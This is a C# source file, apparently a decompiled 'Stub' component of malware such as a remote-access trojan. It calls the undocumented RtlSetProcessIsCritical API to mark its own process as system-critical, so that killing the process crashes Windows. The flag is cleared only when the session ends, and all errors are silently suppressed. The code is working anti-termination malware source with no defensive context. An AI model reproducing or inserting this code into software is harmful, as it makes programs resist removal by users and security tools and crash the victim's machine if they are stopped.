using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Stub
{
	public class ProcessCritical
	{
		[DllImport("NTdll.dll", EntryPoint = "RtlSetProcessIsCritical", SetLastError = true)]
		public static extern void SetCurrentProcessIsCritical([MarshalAs(UnmanagedType.Bool)] bool isCritical, [MarshalAs(UnmanagedType.Bool)] ref bool refWasCritical, [MarshalAs(UnmanagedType.Bool)] bool needSystemCriticalBreaks);

		public static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
		{
			CriticalProcesses_Disable();
		}

		public static void CriticalProcess_Enable()
		{
			try
			{
				SystemEvents.SessionEnding += SystemEvents_SessionEnding;
				Process.EnterDebugMode();
				bool refWasCritical = default(bool);
				SetCurrentProcessIsCritical(isCritical: true, ref refWasCritical, needSystemCriticalBreaks: false);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}

		public static void CriticalProcesses_Disable()
		{
			try
			{
				bool refWasCritical = default(bool);
				SetCurrentProcessIsCritical(isCritical: false, ref refWasCritical, needSystemCriticalBreaks: false);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}
}
